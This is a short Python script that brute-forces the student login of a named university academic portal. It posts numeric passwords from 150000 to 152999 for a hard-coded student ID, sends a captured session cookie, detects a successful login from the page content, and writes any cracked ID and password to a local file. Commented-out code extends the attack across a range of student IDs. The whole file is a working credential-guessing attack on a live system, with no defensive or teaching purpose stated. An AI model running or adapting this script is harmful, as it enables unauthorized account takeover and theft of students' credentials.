# -*- coding: UTF-8 -*-

'''
Created on 2016年2月28日

@author: NJNUGGET
'''
import requests
from BeautifulSoup import BeautifulSoup as bsoup

headers = {
'Host':'desktop.nju.edu.cn:8080',
# 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
# 'Accept-Language': 'zh-cn',
# 'Accept-Encoding': 'gzip, deflate',
# 'Content-Type': 'application/x-www-form-urlencoded',
# 'Origin': 'http://desktop.nju.edu.cn:8080',
# 'Content-Length': '49',
# 'Connection': 'keep-alive',
# 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9',
'Referer': 'http://desktop.nju.edu.cn:8080/jiaowu/',
'Cookie': 'JSESSIONID=0F8BDB547672D412A998D59CB3BF0035'
}
data_login = {'password':'',
              'userName':'',
              'returnUrl':''}
file1 = open("password.txt","a")
class SQL():
    flag = False
    def order(self,data1):
        s = requests.Session()
        url = "http://desktop.nju.edu.cn:8080/jiaowu/login.do"
        r1 = s.post(url,data=data1,headers=headers)
        soup = bsoup(r1.text)
        name = soup.find(id='UserInfo')
        print(str(data1['password']))
        if name is not None:
            file1.write("学号："+str(data1['userName'])+" 密码："+str(data1['password'])+"\n")
            print("学号："+str(data1['userName'])+" 密码："+str(data1['password'])+"\n")
            exit(1)
    
if __name__ == '__main__':
    print("start")
#     data_login['userName'] = '121070039'
    
    data_login['returnUrl'] = 'null'
#     for j in range(131010073,131010100):
        
    data_login['userName'] = 151250013
    for i in range(150000,153000):
        data_login['password'] = i
        test = SQL()
        test.order(data_login)
#             if test.flag is True:
#                 break